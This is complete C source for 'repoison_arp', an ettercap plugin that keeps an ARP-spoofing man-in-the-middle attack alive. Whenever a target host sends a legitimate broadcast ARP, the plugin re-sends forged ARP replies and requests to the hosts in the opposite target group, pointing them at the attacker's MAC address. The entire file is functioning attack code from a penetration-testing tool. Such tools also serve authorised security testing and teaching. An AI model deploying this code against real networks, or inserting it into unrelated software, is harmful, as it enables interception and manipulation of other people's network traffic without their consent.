/*
    repoison_arp -- ettercap plugin -- Repoison after a broadcast ARP

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_mitm.h>
#include <time.h>


/* protos */
int plugin_load(void *);
static int repoison_arp_init(void *);
static int repoison_arp_fini(void *);
static void repoison_func(struct packet_object *po);
void repoison_victims(void *group_ptr, struct packet_object *po);


/* plugin operations */
struct plugin_ops repoison_arp_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "repoison_arp",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Repoison after broadcast ARP",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &repoison_arp_init,
   /* deactivation function */                     
   .fini =              &repoison_arp_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &repoison_arp_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int repoison_arp_init(void *dummy) 
{
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("repoison_arp: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }

   hook_add(HOOK_PACKET_ARP_RQ, &repoison_func);
   hook_add(HOOK_PACKET_ARP_RP, &repoison_func);
   

   return PLUGIN_RUNNING;      
}


static int repoison_arp_fini(void *dummy) 
{
   USER_MSG("repoison_arp: plugin terminated...\n");

   hook_del(HOOK_PACKET_ARP_RQ, &repoison_func);
   hook_del(HOOK_PACKET_ARP_RP, &repoison_func);

   return PLUGIN_FINISHED;
}

/*********************************************************/


/* Poison one target list */
void repoison_victims(void *group_ptr, struct packet_object *po)
{
   struct hosts_list *t;

#if !defined(OS_WINDOWS)
   struct timespec tm;
 
   tm.tv_sec = GBL_CONF->arp_storm_delay;
   tm.tv_nsec = 0;
#endif

   LIST_HEAD(, hosts_list) *group_head = group_ptr;

   LIST_FOREACH(t, group_head, next) {

#if !defined(OS_WINDOWS)
      nanosleep(&tm, NULL);
#else
      usleep(GBL_CONF->arp_storm_delay*1000);
#endif

      /* equal ip must be skipped, you cant poison itself */
      if (!ip_addr_cmp(&t->ip, &po->L3.src))
         continue;

      if (!GBL_CONF->arp_poison_equal_mac)
         /* skip even equal mac address... */
         if (!memcmp(t->mac, po->L2.src, MEDIA_ADDR_LEN))
            continue;

      if (GBL_CONF->arp_poison_reply)
         send_arp(ARPOP_REPLY, &po->L3.src, GBL_IFACE->mac, &t->ip, t->mac);
	 
      if (GBL_CONF->arp_poison_request)
         send_arp(ARPOP_REQUEST, &po->L3.src, GBL_IFACE->mac, &t->ip, t->mac);
	 
   }
}


/* Re-poison caches that update on legal broadcast ARP requests */
static void repoison_func(struct packet_object *po)
{
   struct hosts_list *t;

   /* if arp poisonin is not running, do nothing */
   if (!is_mitm_active("arp"))
      return;

   /* Check the target address */
   if (memcmp(po->L2.dst, ARP_BROADCAST, MEDIA_ADDR_LEN))
      return;

   /* search in target 2 */
   LIST_FOREACH(t, &arp_group_two, next)
      if (!ip_addr_cmp(&t->ip, &po->L3.src)) {
         repoison_victims(&arp_group_one, po);
	 break;
      }
      
   /* search in target 1 */
   LIST_FOREACH(t, &arp_group_one, next)
      if (!ip_addr_cmp(&t->ip, &po->L3.src)) {
         repoison_victims(&arp_group_two, po);
	 break;
      }
}

/* EOF */

// vim:ts=3:expandtab
 
